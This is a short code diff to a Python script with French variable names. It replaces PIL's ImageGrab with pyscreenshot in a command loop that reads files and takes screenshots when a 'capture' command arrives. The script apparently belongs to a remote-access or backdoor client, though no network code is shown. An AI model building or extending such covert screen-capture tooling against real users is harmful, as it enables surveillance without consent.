@@ -3,7 +3,7 @@ import time
 import subprocess
 import platform
 import os
-from PIL import ImageGrab
+import pyscreenshot
 import threading
 import concurrent.futures
 
@@ -57,7 +57,7 @@ while True:
             reponse = f.read()
             f.close()
     elif len(commande_split) == 2 and commande_split[0] == "capture":
-            capture_ecran = ImageGrab.grab()
+            capture_ecran = pyscreenshot.grab()
             capture_filename = commande_split[1] + ".png"
             capture_ecran.save(capture_filename, "PNG")
             try:
